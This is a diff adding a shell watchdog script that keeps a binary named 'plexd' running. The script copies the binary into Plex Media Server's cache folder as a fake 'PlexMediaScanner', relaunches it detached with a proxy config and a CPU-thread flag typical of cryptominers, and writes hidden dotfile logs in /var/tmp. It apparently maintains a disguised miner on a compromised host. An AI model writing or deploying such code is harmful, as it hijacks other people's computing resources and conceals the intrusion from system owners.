@@ -1,0 +1,25 @@
+#!/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
+export PATH
+cd "/var/tmp" || exit 0
+isrunning(){
+  for d in /proc/[0-9]*; do
+    E=$(readlink "$d/exe" 2>/dev/null)
+    case "$E" in
+      "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache/PlexMediaScanner"|"/var/tmp/plexd"|"/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache/PlexMediaScanner (deleted)"|"/var/tmp/plexd (deleted)")
+        [ "$(awk '{print $3}' "$d/stat" 2>/dev/null)" = "Z" ] && continue
+        return 0
+        ;;
+    esac
+  done
+  return 1
+}
+echo $(date +%s 2>/dev/null) > "/var/tmp/.pxalive" 2>/dev/null
+isrunning && exit 0
+if [ ! -x "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache/PlexMediaScanner" ]; then cp "/var/tmp/plexd" "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache/PlexMediaScanner" 2>/dev/null; chmod 755 "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache/PlexMediaScanner" 2>/dev/null; fi
+if [ -x "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache/PlexMediaScanner" ]; then RUN="/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Cache/PlexMediaScanner"; else RUN="/var/tmp/plexd"; fi
+if command -v setsid >/dev/null 2>&1; then
+  setsid "$RUN" --config /var/tmp/plex_exp_proxy.json --cpu-max-threads-hint=14 --no-color >>"/var/tmp/.pxlog" 2>&1 </dev/null
+else
+  nohup "$RUN" --config /var/tmp/plex_exp_proxy.json --cpu-max-threads-hint=14 --no-color >>"/var/tmp/.pxlog" 2>&1 </dev/null &
+fi
